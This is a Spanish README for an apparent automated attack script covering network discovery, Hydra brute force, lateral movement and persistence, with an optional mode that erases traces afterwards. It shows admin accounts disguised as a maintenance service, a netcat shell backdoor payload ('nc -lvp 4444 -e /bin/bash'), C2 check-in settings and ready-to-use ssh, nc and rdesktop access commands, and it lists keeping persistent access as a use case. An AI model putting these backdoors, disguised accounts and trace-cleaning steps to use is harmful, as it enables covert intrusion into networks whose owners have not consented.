# SimplifyWFB - Script Simplificado de Pentesting

## Descripción

SimplifyWFB es una versión simplificada del sistema de pentesting que contiene solo las funciones básicas esenciales. Está diseñado para ejecutar dos modos principales:

1. **🚀 Escaneo Completo (Full Scan)**: Ejecuta todas las fases y mantiene persistencia
2. **🧊 Pentest Frío (Cold Pentest)**: Ejecuta todas las fases pero limpia todos los rastros al final

## Características

### 🎯 Fases Implementadas

#### Fase 1: Reconocimiento Completo
- Descubrimiento de hosts en la red
- Escaneo de puertos y servicios
- Detección de tecnologías
- Mapeo de topología de red

#### Fase 2: Recolección de Credenciales
- Ataques de fuerza bruta
- Prueba de credenciales por defecto
- Sniffing de tráfico de red

#### Fase 3: Movimiento Lateral
- Explotación de credenciales encontradas
- Establecimiento de conexiones laterales
- Compromiso de sistemas adicionales

#### Fase 4: Persistencia y Acceso Remoto
- Creación de usuarios persistentes
- Instalación de backdoors
- Establecimiento de conexiones remotas
- Configuración de apuntadores C2

#### Fase 5: Verificación de Persistencias
- Verificación de usuarios creados
- Verificación de backdoors
- Verificación de conexiones remotas

### 🧊 Modo Pentest Frío

En el modo pentest frío, después de completar todas las fases y verificar las persistencias, el sistema:

1. **Elimina usuarios creados**
2. **Remueve backdoors instalados**
3. **Cierra conexiones remotas**
4. **Limpia archivos temporales**
5. **Genera reporte de limpieza**

## Uso

### Ejecución Básica

```bash
python3 simplifywfb.py
```

### Opciones Disponibles

1. **🚀 Escaneo Completo**: Mantiene persistencia para acceso continuo
2. **🧊 Pentest Frío**: Limpia todos los rastros al final
3. **❌ Salir**: Termina el programa

## Reporte JSON

El script genera un único archivo JSON con toda la información:

```json
{
  "metadata": {
    "script_name": "SimplifyWFB",
    "version": "1.0.0",
    "start_time": "2024-01-01T12:00:00",
    "mode": "full|cold",
    "target_network": "192.168.1.0/24",
    "local_ip": "192.168.1.100"
  },
  "phase_1_reconnaissance": {
    "status": "completed",
    "hosts_discovered": [...],
    "services_found": [...],
    "technologies_detected": [...],
    "network_topology": {...}
  },
  "phase_2_credentials": {
    "status": "completed",
    "credentials_found": [...],
    "attack_methods_used": [...]
  },
  "phase_3_lateral_movement": {
    "status": "completed",
    "compromised_systems": [...],
    "lateral_connections": [...]
  },
  "phase_4_persistence": {
    "status": "completed",
    "users_created": [...],
    "backdoors_created": [...],
    "remote_connections": [...],
    "c2_pointers": [...]
  },
  "phase_5_verification": {
    "status": "completed",
    "persistence_checks": [...],
    "access_verification": [...]
  },
  "cleanup": {
    "status": "completed",
    "items_cleaned": [...]
  },
  "summary": {
    "total_hosts": 10,
    "compromised_hosts": 3,
    "persistent_access_points": 5,
    "total_credentials": 8,
    "execution_time": 120.5,
    "success_rate": 30.0
  }
}
```

## Información de Persistencias

El reporte incluye información detallada sobre todas las persistencias establecidas:

### Usuarios Creados
```json
{
  "host": "192.168.1.100",
  "username": "svc_192_168_1_100",
  "password": "P@ssw0rd_100!",
  "groups": ["administrators", "remote_desktop_users"],
  "description": "System Maintenance Service"
}
```

### Backdoors
```json
{
  "host": "192.168.1.100",
  "type": "netcat",
  "port": 4444,
  "method": "reverse_shell",
  "payload": "nc -lvp 4444 -e /bin/bash"
}
```

### Conexiones Remotas
```json
{
  "host": "192.168.1.100",
  "type": "ssh",
  "port": 22,
  "username": "svc_192_168_1_100",
  "password": "P@ssw0rd_100!",
  "persistent": true,
  "auto_reconnect": true
}
```

### Apuntadores C2
```json
{
  "host": "192.168.1.100",
  "c2_server": "192.168.1.200",
  "c2_port": 8080,
  "checkin_interval": 300,
  "method": "http_post",
  "encrypted": true
}
```

## Comandos de Acceso

### Acceso SSH
```bash
ssh svc_192_168_1_100@192.168.1.100
# Contraseña: P@ssw0rd_100!
```

### Acceso Netcat
```bash
nc 192.168.1.100 4444
```

### Acceso RDP
```bash
rdesktop -u svc_192_168_1_100 -p 'P@ssw0rd_100!' 192.168.1.100
```

## Requisitos

- Python 3.6+
- Nmap
- Herramientas de red básicas (ping, nc, ssh)

## Instalación

```bash
# Instalar dependencias
sudo apt install nmap netcat-openbsd openssh-client

# Ejecutar script
python3 simplifywfb.py
```

## ⚠️ ADVERTENCIAS CRÍTICAS

🚨 **ESTE SCRIPT EJECUTA ATAQUES REALES** - NO ES UNA SIMULACIÓN

### Funcionalidades Reales Implementadas:
- ✅ **Ataques de fuerza bruta reales** con Hydra
- ✅ **Explotación real de credenciales** (SSH, FTP, SMB, HTTP)
- ✅ **Creación real de usuarios persistentes** en sistemas
- ✅ **Instalación real de backdoors** con netcat
- ✅ **Acceso remoto real** a sistemas comprometidos
- ✅ **Limpieza real** de rastros en modo cold

### ⚠️ ADVERTENCIAS LEGALES:
- **SOLO PARA USO AUTORIZADO Y EDUCATIVO**
- **EL USO NO AUTORIZADO ES ILEGAL**
- **OBTENGA PERMISO ESCRITO ANTES DE USAR**
- **LOS DESARROLLADORES NO SE HACEN RESPONSABLES**
- **PUEDE CAUSAR DAÑOS REALES A SISTEMAS**
- **SIGA LAS LEYES LOCALES E INTERNACIONALES**

### Requisitos de Autorización:
- Solo use en redes que posea o tenga autorización explícita
- Obtenga permiso por escrito antes de realizar pruebas
- Notifique a los propietarios de los sistemas
- Mantenga registros de autorización

## Diferencias con el Script Original

### Simplificaciones
- Solo 2 modos de ejecución (Full Scan y Cold Pentest)
- Un solo archivo de reporte JSON
- Funciones básicas sin características avanzadas
- Sin interfaz web
- Sin gestión de múltiples escaneos

### Funcionalidades Mantenidas
- Las 4 fases principales del pentesting
- Reconocimiento completo de red
- Recolección de credenciales
- Movimiento lateral
- Persistencia y acceso remoto
- Verificación de persistencias
- Limpieza en modo frío

## Casos de Uso

### Escaneo Completo
- Pruebas de penetración autorizadas
- Evaluaciones de seguridad continuas
- Mantenimiento de accesos persistentes

### Pentest Frío
- Pruebas de concepto
- Demostraciones de vulnerabilidades
- Evaluaciones sin dejar rastros
- Análisis de capacidades

## Soporte

Para reportar problemas o solicitar características, consulte la documentación del proyecto principal.
